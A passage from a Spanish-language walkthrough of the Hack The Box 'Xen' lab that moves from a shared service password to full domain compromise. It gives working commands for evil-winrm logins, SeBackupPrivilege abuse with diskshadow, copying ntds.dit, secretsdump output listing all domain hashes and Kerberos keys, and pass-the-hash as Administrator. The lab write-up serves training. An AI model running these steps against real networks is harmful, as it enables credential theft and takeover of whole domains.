+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ro">[-] </span><span class="p">htb.local\app-svc:#S3rvice#@cc STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\mssql-svc:#S3rvice#@cc
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\print-svc:#S3rvice#@cc
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\xenserver-svc:#S3rvice#@cc
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ro">[-] </span><span class="p">htb.local\:#S3rvice#@cc STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo si escaneamos los <code class="language-plaintext highlighter-rouge">puertos</code> del <code class="language-plaintext highlighter-rouge">Domain Controller</code> haciendo uso de <code class="language-plaintext highlighter-rouge">nmap</code> ademas del clasico <code class="language-plaintext highlighter-rouge">smb</code> podemos ver activo el puerto <code class="language-plaintext highlighter-rouge">5985</code> que es <code class="language-plaintext highlighter-rouge">winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q nmap -sT -T5 -n -Pn 172.16.249.200  
+Nmap scan report for 172.16.249.200
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si revisamos en la información de <code class="language-plaintext highlighter-rouge">bloodhound</code> todo los <code class="language-plaintext highlighter-rouge">usuarios</code> que pertenecen al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> solo encontramos al usuario <code class="language-plaintext highlighter-rouge">backup-svc</code> en el</p>
+<a href="/endgames/xen/19.png" target="_blank"><div><p><img src="/endgames/xen/19.png"></p></div></a>
+
+<p class="plain-text">Ya que tiene el <code class="language-plaintext highlighter-rouge">privilegio</code> y tenemos su contraseña con <code class="language-plaintext highlighter-rouge">evil-winrm</code> podemos conectarnos y obtener una <code class="language-plaintext highlighter-rouge">powershell</code> en el <code class="language-plaintext highlighter-rouge">DC</code> con el usuario <code class="language-plaintext highlighter-rouge">backup-svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i 172.16.249.200 -u backup-svc -p #S3rvice#@cc  
+PS C:\Users\backup-svc\Documents> </span><span class="am">whoami</span><span class="p">
+htb\backup-svc
+PS C:\Users\backup-svc\Documents> </span><span class="am">type </span><span class="p">..\Desktop\flag.txt
+XEN{y_5h4r3d_p@55w0Rd5?}
+PS C:\Users\backup-svc\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag6">
+<br><h3 class="post-title">Owned</h3>
+<h4 class="post-title">XEN{d3r1v471v3_d0m41n_4dm1n}</h4><br>
+
+<p class="plain-text">Entre los <code class="language-plaintext highlighter-rouge">grupos</code> a los que pertenece <code class="language-plaintext highlighter-rouge">backup-svc</code> en <code class="language-plaintext highlighter-rouge">bloodhound</code> podemos ver que esta <code class="language-plaintext highlighter-rouge">Remote Desktop Users</code> que nos permite también conectarnos por <code class="language-plaintext highlighter-rouge">RDP</code></p>
+<a href="/endgames/xen/22.png" target="_blank"><div><p><img src="/endgames/xen/22.png"></p></div></a>
+
+<p class="plain-text">Haciendo uso de <code class="language-plaintext highlighter-rouge">xfreerdp</code> y las <code class="language-plaintext highlighter-rouge">credenciales</code> que tenemos nos conectamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q xfreerdp /u:backup-svc /p:#S3rvice#@cc /v:172.16.249.200 /cert:ignore  </span>
+</code></pre></div></div><br>
+<a href="/endgames/xen/20.png" target="_blank"><div><p><img src="/endgames/xen/20.png"></p></div></a>
+
+<p class="plain-text">Entre los <code class="language-plaintext highlighter-rouge">privilegios</code> que tiene el usuario <code class="language-plaintext highlighter-rouge">backup-svc</code> esta uno que llama bastante la atanción y este es <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> que permite crear <code class="language-plaintext highlighter-rouge">backups</code> del disco</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\backup-svc\Documents> </span><span class="am">whoami </span><span class="p">/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======  
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+PS C:\Users\backup-svc\Documents></span>
+</code></pre></div></div><br>
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">diskshadow</code> desde la sesión de <code class="language-plaintext highlighter-rouge">RDP</code> podemos crear un tipo de <code class="language-plaintext highlighter-rouge">backup</code> de toda la unidad <code class="language-plaintext highlighter-rouge">C:</code> con el alias <code class="language-plaintext highlighter-rouge">xyz</code> el cual vamos a exponer con la unidad <code class="language-plaintext highlighter-rouge">X:</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\backup-svc> </span><span class="am">diskshadow</span><span class="p">
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  4/25/2023 5:40:20 PM
+
+DISKSHADOW> set context persistent nowriters
+
+DISKSHADOW> add volume C: alias xyz
+
+DISKSHADOW> set metadata C:\ProgramData\xyz.cab
+
+DISKSHADOW> create
+Alias xyz for shadow ID {99d84211-b50c-47f6-951b-d0f728bd0b1e} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {f443e047-dbf4-4de0-867f-1156f9ae0a49} set as environment variable.  
+
+Querying all shadow copies with the shadow copy set ID {f443e047-dbf4-4de0-867f-1156f9ae0a49}
+
+        * Shadow copy ID = {99d84211-b50c-47f6-951b-d0f728bd0b1e}               %xyz%
+                - Shadow copy set: {f443e047-dbf4-4de0-867f-1156f9ae0a49}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{78d1dcbd-51bd-4ccf-907c-aa32152ad3f2}\ [C:\]
+                - Creation time: 4/25/2023 5:41:05 PM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+                - Originating machine: DC.htb.local
+                - Service machine: DC.htb.local
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+
+DISKSHADOW> expose %xyz% X:
+-> %xyz% = {99d84211-b50c-47f6-951b-d0f728bd0b1e}
+The shadow copy was successfully exposed as X:\.
+
+DISKSHADOW></span>
+</code></pre></div></div><br>
+<a href="/endgames/xen/16.png" target="_blank"><div><p><img src="/endgames/xen/16.png"></p></div></a>
+
+<p class="plain-text">Con la función <code class="language-plaintext highlighter-rouge">upload</code> incluida en <code class="language-plaintext highlighter-rouge">evil-winrm</code> podemos subir un par de <a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">dlls</a> que nos ayudaran a explotar este <code class="language-plaintext highlighter-rouge">privilegio</code>, después los importamos como <code class="language-plaintext highlighter-rouge">modulos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">upload </span><span class="p">SeBackupPrivilegeCmdLets.dll
+</span><span class="az">
+Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Users\backup-svc\Documents\SeBackupPrivilegeCmdLets.dll  
+</span><span class="sa">
+Data: 16384 bytes of 16384 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\ProgramData> </span><span class="am">upload </span><span class="p">SeBackupPrivilegeUtils.dll
+</span><span class="az">
+Info: Uploading SeBackupPrivilegeUtils.dll to C:\Users\backup-svc\Documents\SeBackupPrivilegeUtils.dll
+</span><span class="sa">
+Data: 21844 bytes of 21844 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\ProgramData> </span><span class="am">Import-Module</span><span class="p"> .\SeBackupPrivilegeUtils.dll
+PS C:\ProgramData> </span><span class="am">Import-Module</span><span class="p"> .\SeBackupPrivilegeCmdLets.dll
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora copiamos los archivos <code class="language-plaintext highlighter-rouge">ntds.dit</code> que contiene los <code class="language-plaintext highlighter-rouge">hashes</code> de todos los usuarios del dominio y <code class="language-plaintext highlighter-rouge">SYSTEM</code> de la copia creada accediendo desde la unidad <code class="language-plaintext highlighter-rouge">Z:</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">Copy-FileSeBackupPrivilege </span><span class="p">X:\Windows\NTDS\ntds.dit ntds.dit
+PS C:\ProgramData> </span><span class="am">Copy-FileSeBackupPrivilege </span><span class="p">X:\Windows\System32\Config\SYSTEM SYSTEM  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos conectarnos con <code class="language-plaintext highlighter-rouge">smbclient</code> de <code class="language-plaintext highlighter-rouge">impacket</code> y usando el recurso <code class="language-plaintext highlighter-rouge">C$</code>, entrar a la carpeta <code class="language-plaintext highlighter-rouge">ProgramData</code> donde tenemos nuestros archivos y descargarlos con <code class="language-plaintext highlighter-rouge">get</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-smbclient htb.local/backup-svc:#S3rvice#@cc@172.16.249.200  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+# use C$
+# cd ProgramData
+# get ntds.dit
+# get SYSTEM
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora en local con la herramienta <code class="language-plaintext highlighter-rouge">secretsdump</code> de <code class="language-plaintext highlighter-rouge">impacket</code>, le pasamos el <code class="language-plaintext highlighter-rouge">SYSTEM</code> y el <code class="language-plaintext highlighter-rouge">ntds.dit</code> que hemos descargado dumpeamos todos los <code class="language-plaintext highlighter-rouge">hashes</code> del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">LOCAL -system SYSTEM -ntds ntds.dit
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x6e398137ec7f2e204671dad7c778509f
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 4a62a0ac1475b54add921ac8c1b72e31
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:5e507509602e1b651759527b87b6c347:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3791ca8d70c9e1d2d2c7c5b5c7c253e8:::
+CITRIX$:1103:aad3b435b51404eeaad3b435b51404ee:fd981d0c915932bb3ddf38b415c49121:::
+htb.local\alarsson:1104:aad3b435b51404eeaad3b435b51404ee:92a44f1aa6259c55f9f514fabae5cc3f:::
+htb.local\jmendes:1106:aad3b435b51404eeaad3b435b51404ee:10d0c05f7d958955f0eaf1479b5124a0:::
+htb.local\pmorgan:1107:aad3b435b51404eeaad3b435b51404ee:8618ba932416a7404a854b250bf28577:::
+htb.local\awardel:1108:aad3b435b51404eeaad3b435b51404ee:270e4d446437f4383b092b42a9f88f0a:::
+VDESKTOP3$:1109:aad3b435b51404eeaad3b435b51404ee:e582f9b9d77dae6357bb574620b721ce:::
+VDESKTOP2$:1110:aad3b435b51404eeaad3b435b51404ee:f583f9b5fc860b9ae21e482caaad0553:::
+VDESKTOP1$:1111:aad3b435b51404eeaad3b435b51404ee:f96d793a4b9d2b8517123ad8d1e26b03:::
+htb.local\xenserver-svc:1112:aad3b435b51404eeaad3b435b51404ee:ffc86906b87839a80c9a5df66fd39452:::
+htb.local\print-svc:1113:aad3b435b51404eeaad3b435b51404ee:ffc86906b87839a80c9a5df66fd39452:::
+htb.local\mssql-svc:1115:aad3b435b51404eeaad3b435b51404ee:ffc86906b87839a80c9a5df66fd39452:::
+htb.local\mturner:1117:aad3b435b51404eeaad3b435b51404ee:330e8573172989af7b756c4b831d7788:::
+htb.local\app-svc:1118:aad3b435b51404eeaad3b435b51404ee:feabcb5e62391216ff8ba2bbf487298b:::
+htb.local\rprakash:1119:aad3b435b51404eeaad3b435b51404ee:64b49f377000aa5e512625de928e6a05:::
+LAPTOP1$:1120:aad3b435b51404eeaad3b435b51404ee:fafcb53e7c9e126632dee80a69a6bc40:::
+LAPTOP2$:1121:aad3b435b51404eeaad3b435b51404ee:a898f3e4f7766d961f1c93d96e52821e:::
+LAPTOP3$:1122:aad3b435b51404eeaad3b435b51404ee:ff9313db8ceebfb0e37be27dcbda8011:::
+LAPTOP5$:1123:aad3b435b51404eeaad3b435b51404ee:bb0e3fae33f0f5fa0149e0eca3ea8802:::
+LAPTOP6$:1124:aad3b435b51404eeaad3b435b51404ee:fb6667b6521fcb2e3c8ab72688e560d1:::
+htb.local\urquarti:1125:aad3b435b51404eeaad3b435b51404ee:182bc93cf09b8c0f5061facd4976f664:::
+htb.local\rdrew:1137:aad3b435b51404eeaad3b435b51404ee:22cb6094730daf99418dc0373ed0a46e:::
+htb.local\fboucher:1138:aad3b435b51404eeaad3b435b51404ee:7f2dca6c6f0865f8955e720063a98f4c:::
+htb.local\cmeller:1139:aad3b435b51404eeaad3b435b51404ee:be5d31e3ee91641b2f4d5ad7da384c4b:::
+htb.local\anagy:1140:aad3b435b51404eeaad3b435b51404ee:b53e1fc07b17a1dd5637db069ce81f67:::
+WK01$:1142:aad3b435b51404eeaad3b435b51404ee:e7ef2a5d6ae326424d8f4b936fe8a129:::
+WK02$:1143:aad3b435b51404eeaad3b435b51404ee:e55fbb54432c61dea5f21874a342583d:::
+WK03$:1144:aad3b435b51404eeaad3b435b51404ee:acbf68032188283bfdaadea761b9a700:::
+WK04$:1145:aad3b435b51404eeaad3b435b51404ee:ecbbb4c9d9b1817aaaa47f3bebcec950:::
+WK05$:1146:aad3b435b51404eeaad3b435b51404ee:1b4e60ea2d87ec132336aa0cb06cb58c:::
+WK06$:1147:aad3b435b51404eeaad3b435b51404ee:2c17c9ff7dd85996f1078a12eb469f4a:::
+WK07$:1149:aad3b435b51404eeaad3b435b51404ee:cc2413c14387878386b6a9d62f75f72e:::
+WK09$:1150:aad3b435b51404eeaad3b435b51404ee:1e0a5fed55e52312227b5769013fa7e9:::
+htb.local\backup-svc:1151:aad3b435b51404eeaad3b435b51404ee:ffc86906b87839a80c9a5df66fd39452:::
+htb.local\test-svc:1152:aad3b435b51404eeaad3b435b51404ee:4e36a1854ae7cc3681b6168fe5906e45:::
+htb.local\netscaler-svc:1602:aad3b435b51404eeaad3b435b51404ee:ffc86906b87839a80c9a5df66fd39452:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:eeae682fea0120839f5cf840279b650a223418a334861b32001dbaab7060b0cb
+Administrator:aes128-cts-hmac-sha1-96:4e77eb212c9c89234d061171eb981b92
+Administrator:des-cbc-md5:2ac7b38ff1a48f67
+DC$:aes256-cts-hmac-sha1-96:61d67418b4a65e6b6161b86fcd1abfe55b0e4f2f5d8efb339816b67825082e9f
+DC$:aes128-cts-hmac-sha1-96:38a2a2858c324ab9993eedf9b9bed4f3
+DC$:des-cbc-md5:ad6452c4072c57d9
+krbtgt:aes256-cts-hmac-sha1-96:a67001bfb6c76224f2156450518191893c84d3cb6cee2956ef2659635a692458
+krbtgt:aes128-cts-hmac-sha1-96:2f187b734a44d3344028d9c50de6d45c
+krbtgt:des-cbc-md5:7675192346f80864
+CITRIX$:aes256-cts-hmac-sha1-96:72eb6b137275e892b09fc74714ea068512a7c8b2adc2e24f260e8e76783e29c7
+CITRIX$:aes128-cts-hmac-sha1-96:7c96d2b6f85994f52f9b14e18bf73618
+CITRIX$:des-cbc-md5:3468c72cb58f547a
+htb.local\alarsson:aes256-cts-hmac-sha1-96:2e7be1f105bcd413783a682a27ec6e3424c1a93a507b831a4b75e1efca570e78
+htb.local\alarsson:aes128-cts-hmac-sha1-96:53db5c1a232a02eb7ceeb620650d730c
+htb.local\alarsson:des-cbc-md5:e068792fe58c37ea
+htb.local\jmendes:aes256-cts-hmac-sha1-96:d91d10c9f00b17f3e3d29dee98af067c19884da47ec34b8f33750a74ca0410ee
+htb.local\jmendes:aes128-cts-hmac-sha1-96:ad976084f2d76cc6527b623a42f878ef
+htb.local\jmendes:des-cbc-md5:2638f87697cde61f
+htb.local\pmorgan:aes256-cts-hmac-sha1-96:fafd1c2483f05d20ea355448192719b6aca35fec1ef975b5a5c624de43c01ba3
+htb.local\pmorgan:aes128-cts-hmac-sha1-96:90e2852e2c2357dcb43735a46a01e9f3
+htb.local\pmorgan:des-cbc-md5:5773647cfbece580
+htb.local\awardel:aes256-cts-hmac-sha1-96:f4135a5898349631bbf9976776615c5b2369ae0d00c7f91af6348a202a93666f
+htb.local\awardel:aes128-cts-hmac-sha1-96:2d619944af0976beaf6f9b3c529665e6
+htb.local\awardel:des-cbc-md5:3d9852e5e5fe08d9
+VDESKTOP3$:aes256-cts-hmac-sha1-96:0dfdb6fb02b612d20e71f7c352eb918c7cc12679fa71d33ece0d4bff1602c452
+VDESKTOP3$:aes128-cts-hmac-sha1-96:775c3974a30607b87ee1485bb849d1f8
+VDESKTOP3$:des-cbc-md5:3de3b9c40da7cbc4
+VDESKTOP2$:aes256-cts-hmac-sha1-96:67f8834883f679e28326b9c416ee0772a976cbc89fa904df407441fd763e623e
+VDESKTOP2$:aes128-cts-hmac-sha1-96:baddab259a607c381adf118bf9bedf8b
+VDESKTOP2$:des-cbc-md5:d32aa48326d585f8
+VDESKTOP1$:aes256-cts-hmac-sha1-96:c0b601d91c47b8561cd3b8a41602b2dab6156d21135f52d92685fd4b71137794
+VDESKTOP1$:aes128-cts-hmac-sha1-96:f1876be811720aec380948053a2bfa9e
+VDESKTOP1$:des-cbc-md5:ec15c8269798e076
+htb.local\xenserver-svc:aes256-cts-hmac-sha1-96:e93ba34ca8302dcfd988471ca49705c19078297ba4b2a554e6ef2f56bd2606d0
+htb.local\xenserver-svc:aes128-cts-hmac-sha1-96:17af7b322987bb99a9961620a7ea54c5
+htb.local\xenserver-svc:des-cbc-md5:5eb9a8fb91c75d57
+htb.local\print-svc:aes256-cts-hmac-sha1-96:8e1a24efa266b33c1e5cfd5de1c678b29d0ef2d24f22eec48fe180f869d7dd2c
+htb.local\print-svc:aes128-cts-hmac-sha1-96:7761dc9a8c9d579233bf0f9e4fa9a76e
+htb.local\print-svc:des-cbc-md5:5dec430437e68a52
+htb.local\mssql-svc:aes256-cts-hmac-sha1-96:7c9cbd4961788963c434e2d68e5d10eeb0b31432d54c5f97c67a3aec5841334d
+htb.local\mssql-svc:aes128-cts-hmac-sha1-96:7bbe39d16a768bcb90a2845388654fab
+htb.local\mssql-svc:des-cbc-md5:a2899257cbc86e3b
+htb.local\mturner:aes256-cts-hmac-sha1-96:3fd0741a675313dcccbc9d15326aca33157da79adbf29b983e0b99cda27be9d2
+htb.local\mturner:aes128-cts-hmac-sha1-96:6364145fad3f59dc79992a0abdea551c
+htb.local\mturner:des-cbc-md5:3415c8b9fdad377a
+htb.local\app-svc:aes256-cts-hmac-sha1-96:b4ac26617c753a88429e9ab336426ef3ef0d4d4915f45db0b80e62bfcc8fc2a5
+htb.local\app-svc:aes128-cts-hmac-sha1-96:9f2601ed8d2a622b363937fd605e7e75
+htb.local\app-svc:des-cbc-md5:a2b6dce3cd02ab34
+htb.local\rprakash:aes256-cts-hmac-sha1-96:a44f3db333a59f90b6ade01b6f7d22a5da2059315b119f05bc755053c132967f
+htb.local\rprakash:aes128-cts-hmac-sha1-96:e36ddd0004eca6a394e1a790c5389148
+htb.local\rprakash:des-cbc-md5:f7da54b940981a97
+LAPTOP1$:aes256-cts-hmac-sha1-96:41fca391ab1ca4c39b98342da3ee718e9e53795f65d254cb28ff3e12a6b56c24
+LAPTOP1$:aes128-cts-hmac-sha1-96:bb3c3e49cc4bb7de0284a5fbebf3dd79
+LAPTOP1$:des-cbc-md5:23f4912fdfe9c7cb
+LAPTOP2$:aes256-cts-hmac-sha1-96:f06bf5b3959cfc0bedb1f7f52c9d89d2ff419bb264e4f50135bf2513a20ce019
+LAPTOP2$:aes128-cts-hmac-sha1-96:fe47a3b3c1b7c5d2063855aa34cb9edf
+LAPTOP2$:des-cbc-md5:df4c769e0e5b76da
+LAPTOP3$:aes256-cts-hmac-sha1-96:26d72e03fa8f066546b1a9ed81da1e531554574d7e792066293c28b10dc07ff5
+LAPTOP3$:aes128-cts-hmac-sha1-96:ef548fd68edc04c648fc028d14fef6ae
+LAPTOP3$:des-cbc-md5:adf73151a2dfaba8
+LAPTOP5$:aes256-cts-hmac-sha1-96:3aea19a0f81ee5953aed4f9f120b62631d98cfa5fd79fd72feee31c4b7d9e683
+LAPTOP5$:aes128-cts-hmac-sha1-96:07947532a1ba3d85ae9a0af0ead03df5
+LAPTOP5$:des-cbc-md5:a14683bfec10041c
+LAPTOP6$:aes256-cts-hmac-sha1-96:08ff2ca4a5b08b38cda01283e30ac6c5060b7df1b1a31704ce999e1e6f82e826
+LAPTOP6$:aes128-cts-hmac-sha1-96:1c3c09621a71454d68628ea8ad7f3efb
+LAPTOP6$:des-cbc-md5:daae0794ae9b4c45
+htb.local\urquarti:aes256-cts-hmac-sha1-96:8b16b04964ee76e1dd552aec8ae9d0a5814f5540cfc1633e82d94a83ac0b44bf
+htb.local\urquarti:aes128-cts-hmac-sha1-96:95020927b31af43490b318a71c7c6d30
+htb.local\urquarti:des-cbc-md5:73513b1c7a254ab6
+htb.local\rdrew:aes256-cts-hmac-sha1-96:9b5a0c3331c19aa3f2105a8ac580c8517420ec1eb0dbc9f628fa75a90c430c9b
+htb.local\rdrew:aes128-cts-hmac-sha1-96:2cb7d0a1c8e47e57622b2c4cef38f653
+htb.local\rdrew:des-cbc-md5:7fbca7bafd52ece9
+htb.local\fboucher:aes256-cts-hmac-sha1-96:cf0901292925026c6016e2a4cce50754dead6aeb5c0810be574b340a240c037b
+htb.local\fboucher:aes128-cts-hmac-sha1-96:5a9f7dcf35f69a2910af82d275950f64
+htb.local\fboucher:des-cbc-md5:2067374fefc1d56e
+htb.local\cmeller:aes256-cts-hmac-sha1-96:87a86ed952630e3bac9b8af26d5e6f0c1d600f80b8de68f447c03f12f0089b83
+htb.local\cmeller:aes128-cts-hmac-sha1-96:0d5f1803002032e36b232454de023d25
+htb.local\cmeller:des-cbc-md5:cea14a45751fb3cb
+htb.local\anagy:aes256-cts-hmac-sha1-96:7db3d41cfd047cae47e535bb9dd081803fbd9d506ed4fccf61ee68942953785f
+htb.local\anagy:aes128-cts-hmac-sha1-96:ef235f741cb6e0aaf96233ff44e36b9b
+htb.local\anagy:des-cbc-md5:6de0203d1a4cea02
+WK01$:aes256-cts-hmac-sha1-96:b15ed9285ad9eb4f657e6c53d9208c1f93eacf7a7ffe60ed1d66900c69932a14
+WK01$:aes128-cts-hmac-sha1-96:92eadcddca5722eb4852c3c7695bd675
+WK01$:des-cbc-md5:45012970c2fd978c
+WK02$:aes256-cts-hmac-sha1-96:b360f46dc8c76522508e4ce7c057f5c54ff97633855260f007a394e10d1d6fe9
+WK02$:aes128-cts-hmac-sha1-96:c616f6b97592811ffd188981e47013a8
+WK02$:des-cbc-md5:fbf45d5407700438
+WK03$:aes256-cts-hmac-sha1-96:d687ad11c23ee33f915f02d187c102a64a9f965353dce728af483af32d373253
+WK03$:aes128-cts-hmac-sha1-96:99ffe501a1b9315de908581a479a1905
+WK03$:des-cbc-md5:f74f8564641cc2d9
+WK04$:aes256-cts-hmac-sha1-96:4ecc004e82e349c692f30cb28cd69336f1eb07440ea74ea1b53fcc97d2afda79
+WK04$:aes128-cts-hmac-sha1-96:e265b80c714ac59416acc4665a0c3191
+WK04$:des-cbc-md5:a801d36429f4b9da
+WK05$:aes256-cts-hmac-sha1-96:8d76ad3a60a32ea9584c5fd045f64668c1387a251981d5457aeac93ba3920b14
+WK05$:aes128-cts-hmac-sha1-96:3168586f11bac1f16633a2cdc755018b
+WK05$:des-cbc-md5:6ea191fe7a85a8f4
+WK06$:aes256-cts-hmac-sha1-96:f9d5d01712e4b873e2e7588f635f9373476b7eab58757b68137c9240697da1d4
+WK06$:aes128-cts-hmac-sha1-96:cbe9710ee38dc52d4c3cf68fd7c44a4f
+WK06$:des-cbc-md5:4c027f2516857380
+WK07$:aes256-cts-hmac-sha1-96:4f1cd1f1db09450ea89443cd8d3fbc98232457d61cfe20baeba492d94dbca7d6
+WK07$:aes128-cts-hmac-sha1-96:810e5b35c75166108798e3ba275f0493
+WK07$:des-cbc-md5:d920d6349b10154f
+WK09$:aes256-cts-hmac-sha1-96:752ad9fa558cbf45543f8a2d0ebf1e9525f612d06cf48e1698785903e9ae738f
+WK09$:aes128-cts-hmac-sha1-96:f06109d04b2a64af591c2b5d172ff2ef
+WK09$:des-cbc-md5:cdbc866e6b3ddc16
+htb.local\backup-svc:aes256-cts-hmac-sha1-96:628a8f9db4eb152717dca67e8d3c996827f02c2fdbfe2d427d783c369c86f328
+htb.local\backup-svc:aes128-cts-hmac-sha1-96:ccd79fe595de98935f2dc557bcd175fb
+htb.local\backup-svc:des-cbc-md5:7c916bfebfaee308
+htb.local\test-svc:aes256-cts-hmac-sha1-96:8bc92a6544e449c9051c5b4a5e0a8c11908927d8e6409f58067f91b22f69051b
+htb.local\test-svc:aes128-cts-hmac-sha1-96:99e7edfc2feee188005c71bff7d65c16
+htb.local\test-svc:des-cbc-md5:136b917097e69149
+htb.local\netscaler-svc:aes256-cts-hmac-sha1-96:b81fce62fe63a6240ca8e4bb04d6700ca6c2d0a9a3e614db5811879291a04b99  
+htb.local\netscaler-svc:aes128-cts-hmac-sha1-96:bdaaa24b4d91a8ce54eb9f62c60ec162
+htb.local\netscaler-svc:des-cbc-md5:f18a4c4cd34a2a52
+[*] Cleaning up...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> comprobamos el hash de <code class="language-plaintext highlighter-rouge">Administrator</code> sobre el dominio, al ser <code class="language-plaintext highlighter-rouge">valido</code> tenemos comprometido el <code class="language-plaintext highlighter-rouge">DC</code> y todos los equipos asociados al <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q crackmapexec smb 172.16.249.200-205 -u Administrator -H 822601ccd7155f47cd955b94af1558be 
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:VDESKTOP3) (domain:htb.local) (signing:False) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:htb.local) (signing:True) (SMBv1:False)
+</span><span class="az">SMB         </span><span class="p">172.16.249.201  445    CITRIX           </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:822601ccd7155f47cd955b94af1558be </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">172.16.249.205  445    VDESKTOP3        </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:822601ccd7155f47cd955b94af1558be </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">172.16.249.200  445    DC               </span><span class="ve">[+] </span><span class="p">htb.local\Administrator:822601ccd7155f47cd955b94af1558be </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> al <code class="language-plaintext highlighter-rouge">DC</code> haciendo un <code class="language-plaintext highlighter-rouge">passthehash</code> y obtenemos una <code class="language-plaintext highlighter-rouge">shell</code>, finalmente leemos la <code class="language-plaintext highlighter-rouge">flag</code></p>
